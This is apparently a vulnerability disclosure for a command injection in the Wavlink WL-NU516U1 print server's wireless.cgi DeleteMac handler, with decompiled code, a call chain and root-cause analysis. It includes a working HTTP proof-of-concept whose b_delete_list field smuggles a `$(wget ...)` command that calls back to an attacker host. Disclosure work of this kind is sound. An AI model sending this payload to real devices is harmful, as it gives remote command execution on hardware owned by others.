# WL-NU516U1 wireless.cgi DeleteMac b_delete_list Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `DeleteMac`, the function `sub_402D1C` is invoked.

The function reads `b_delete_list` from POST data via `sub_405EA8` and concatenates it into a shell command:

```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
sub_405314(v20);  // calls system()
```

The `b_delete_list` parameter is the 3rd argument in the sprintf call (variable `v8`). No sanitization is applied.

## Binary Analysis

### Call Chain

```
ftext (main router)
  → sub_402D1C (DeleteMac handler)
    → sub_405EA8 (URL decode, reads b_delete_list POST parameter)
    → sprintf (concatenates into shell command)
    → sub_405314 (system() wrapper)
```

### Key Functions

**sub_402D1C (DeleteMac handler):**
- Reads four POST parameters via `sub_405EA8`:
  - `delete_list` → variable `v4`
  - `delete_al_mac` → variable `v6`
  - `b_delete_list` → variable `v8`
  - `b_delete_al_mac` → variable `v10`
- Concatenates all four into a shell command and executes via `sub_405314`

**sub_405314 (system wrapper):**
```c
void sub_405314(const char *cmd) {
    system(cmd);
}
```

### Vulnerability Flow

1. User sends POST request with `page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=$(wget http://attacker:6666/callback)`
2. `sub_402D1C` reads `b_delete_list` → `$(wget http://attacker:6666/callback)`
3. No input filter is called (unlike GuestWifi handler)
4. sprintf constructs: `/etc/lighttpd/www/cgi-bin/del_mac.sh yAA yBB y$(wget http://attacker:6666/callback) y &`
5. `sub_405314` calls `system()`, shell interprets `$(wget ...)` as command substitution
6. `wget` connects to attacker's server, confirming command execution

### Parameter Position

The `b_delete_list` parameter is the 3rd argument in the sprintf call:
```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", 
        v4,           // delete_list (1st)
        v6,           // delete_al_mac (2nd)
        v8,           // b_delete_list (3rd) ← THIS PARAMETER
        v10);         // b_delete_al_mac (4th)
```

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 95

page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=$(wget http://192.168.6.1:6666/b_del)
```

**Verification:** Monitor receives `GET /b_del` from device IP, confirming command execution.

## Root Cause Summary

The root cause is:
1. No input sanitization or validation of the `b_delete_list` parameter
2. No input filter function is called in the DeleteMac handler
3. Direct concatenation of user input into a shell command passed to `system()`
